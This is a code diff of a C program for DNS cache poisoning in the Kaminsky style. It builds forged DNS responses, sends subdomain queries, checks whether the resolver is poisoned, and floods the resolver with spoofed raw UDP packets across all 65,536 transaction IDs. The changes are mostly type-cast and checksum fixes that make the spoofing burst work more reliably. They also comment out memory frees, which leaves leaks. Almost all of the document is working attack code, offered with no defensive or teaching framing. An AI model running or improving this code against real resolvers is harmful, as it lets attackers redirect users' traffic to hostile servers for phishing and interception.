@@ -83,7 +83,7 @@ void send_first_request(void) {
 }
 
 uint16_t checksum_calc (uint16_t *buf, int len) {
-    uint16_t sum = 0;
+    uint32_t sum = 0;
     int i = 0;
 
     while (len > 1) {
@@ -100,7 +100,7 @@ uint16_t checksum_calc (uint16_t *buf, int len) {
         sum = (sum & 0xFFFF) + (sum >> 16);
     }
 
-    return ~sum;
+    return (uint16_t)(~sum);
 }
 
 uint16_t udp_checksum_calc (struct my_ip_header *ip_header, struct my_udp_header *udp_header, uint8_t *udp_data, int data_length) {
@@ -142,7 +142,7 @@ uint16_t udp_checksum_calc (struct my_ip_header *ip_header, struct my_udp_header
         checksum_sum = (checksum_sum & 0xFFFF) + (checksum_sum >> 16);
     }
 
-    return ~checksum_sum;
+    return (uint16_t)(~checksum_sum);
 }
 
 int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t txid, const char* subdomain) {
@@ -228,7 +228,7 @@ void send_subdomain_query(const char* domain_name) {
     query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
     if (!query) {
         printf("ldns_pkt_query_new failed..");
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         exit(1);
     }
 
@@ -237,7 +237,7 @@ void send_subdomain_query(const char* domain_name) {
     if (status != LDNS_STATUS_OK) {
         printf("ldns_pkt2wire failed\n");
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         exit(1);
     }
 
@@ -246,7 +246,7 @@ void send_subdomain_query(const char* domain_name) {
         printf("udp socket failed..\n");
         free(wire);
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         exit(1);
     }
 
@@ -262,14 +262,14 @@ void send_subdomain_query(const char* domain_name) {
         close(udp_sockfd);
         free(wire);
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         exit(1);
     }
 
     close(udp_sockfd);
     free(wire);
     ldns_pkt_free(query);
-    ldns_rdf_deep_free(name);
+    ////ldns_rdf_deep_free(name);
 }
 
 int check_poisoned(void) {
@@ -290,7 +290,7 @@ int check_poisoned(void) {
     query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
     if (!query) {
         printf("ldns_pkt_query_new failed..");
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         return 0;
     }
 
@@ -299,7 +299,7 @@ int check_poisoned(void) {
     if (status != LDNS_STATUS_OK) {
         printf("ldns_pkt2wire failed\n");
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         return 0;
     }
 
@@ -308,7 +308,7 @@ int check_poisoned(void) {
         printf("udp socket failed..\n");
         free(wire);
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         return 0;
     }
 
@@ -317,14 +317,14 @@ int check_poisoned(void) {
     resolver.sin_port = htons((RESOLVER_DNS_PORT));
     inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);
 
-    printf("[CLIENT] Sending subdomain query for %s -> resolver (%s:53)..\n", RESOLVER_IP);
+    printf("[CLIENT] Sending subdomain query -> resolver (%s:53)..\n", RESOLVER_IP);
 
     if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
         printf("sendto failed..");
         close(udp_sockfd);
         free(wire);
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         return 0;
     }
 
@@ -341,7 +341,7 @@ int check_poisoned(void) {
         close(udp_sockfd);
         free(wire);
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        //ldns_rdf_deep_free(name);
         return 0;
     }
 
@@ -352,7 +352,7 @@ int check_poisoned(void) {
         close(udp_sockfd);
         free(wire);
         ldns_pkt_free(query);
-        ldns_rdf_deep_free(name);
+        ////ldns_rdf_deep_free(name);
         return 0;
     }
 
@@ -385,7 +385,7 @@ int check_poisoned(void) {
     close(udp_sockfd);
     free(wire);
     ldns_pkt_free(query);
-    ldns_rdf_deep_free(name);
+    ////ldns_rdf_deep_free(name);
     ldns_pkt_free(resp_pkt);
     return poisoned;
 }
@@ -397,7 +397,7 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
     int packets_sent = 0;
 
     raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-    if (raw_socket <0 ) {
+    if (raw_socket < 0) {
         printf("ERROR: could not create socket");
         return 0;
     }
@@ -413,11 +413,13 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
     target_address.sin_family = AF_INET;
     inet_pton(AF_INET, RESOLVER_IP, &target_address.sin_addr);
 
+    // Fix 1: Use int instead of uint16_t to avoid comparison warning
     for (int txid = 0; txid < 65536 && packets_sent < budget; txid++) {
         uint8_t *dns_data = NULL;
         size_t dns_size = 0;
 
-        int dns_created = create_kaminsky_response(&dns_data, &dns_size, txid, subdomain);
+        // Fix 2: Cast int to uint16_t for the function call
+        int dns_created = create_kaminsky_response(&dns_data, &dns_size, (uint16_t)txid, subdomain);
         if (dns_created != 1 || dns_data == NULL) {
             continue;
         }
@@ -425,12 +427,12 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
         memset(packet_buffer, 0, sizeof(packet_buffer));
 
         struct my_ip_header *ip_header = (struct my_ip_header *)packet_buffer;
-        struct my_udp_header *udp_header = (struct  my_udp_header *)(packet_buffer + sizeof(struct my_ip_header));
+        struct my_udp_header *udp_header = (struct my_udp_header *)(packet_buffer + sizeof(struct my_ip_header));
         uint8_t *dns_payload = packet_buffer + sizeof(struct my_ip_header) + sizeof(struct my_udp_header);
 
         ip_header->version_and_length = (4 << 4) | 5;
         ip_header->type_of_service = 0;
-        ip_header->identification = htons(txid);
+        ip_header->identification = htons((uint16_t)txid);  // Cast int to uint16_t
         ip_header->fragment_info = 0;
         ip_header->time_to_live = 64;
         ip_header->protocol = IPPROTO_UDP;
@@ -440,18 +442,25 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
         inet_pton(AF_INET, RESOLVER_IP, &ip_header->destination_ip);
 
         udp_header->source_port = htons(53);
-        udp_header->destination_port = htons(resolver_port);
-        udp_header->length = htons(sizeof(struct my_udp_header) + dns_size);
+        // Fix 3: Cast int to uint16_t
+        udp_header->destination_port = htons((uint16_t)resolver_port);
+        // Fix 4: Cast size calculation to uint16_t
+        udp_header->length = htons((uint16_t)(sizeof(struct my_udp_header) + dns_size));
 
         memcpy(dns_payload, dns_data, dns_size);
 
-        int total_packet_size = sizeof(struct my_ip_header) + sizeof(struct my_udp_header) + dns_size;
-        ip_header->total_length = htons(total_packet_size);
+        // Fix 5: Keep as size_t but cast appropriately when used
+        size_t total_packet_size = sizeof(struct my_ip_header) + sizeof(struct my_udp_header) + dns_size;
+        // Fix 6: Cast size_t to uint16_t
+        ip_header->total_length = htons((uint16_t)total_packet_size);
 
         ip_header->header_checksum = checksum_calc((uint16_t *)ip_header, sizeof(struct my_ip_header));
-        udp_header->checksum = udp_checksum_calc(ip_header, udp_header, dns_payload, dns_size);
+        // Fix 7: Cast size_t to int
+        udp_header->checksum = udp_checksum_calc(ip_header, udp_header, dns_payload, (int)dns_size);
 
-        int bytes_sent = sendto(raw_socket, packet_buffer, total_packet_size, 0, (struct sockaddr *)&target_address, sizeof(target_address));
+        // Fix 8: Use ssize_t for sendto return, keep total_packet_size as size_t
+        ssize_t bytes_sent = sendto(raw_socket, packet_buffer, total_packet_size, 0,
+                                   (struct sockaddr *)&target_address, sizeof(target_address));
         if (bytes_sent > 0) {
             packets_sent = packets_sent + 1;
         }
@@ -463,7 +472,7 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
         }
     }
     close(raw_socket);
-    printf("[SPOOF] aTTACK COMPLETE");
+    printf("[SPOOF] ATTACK COMPLETE\n");
 
     return packets_sent;
 }
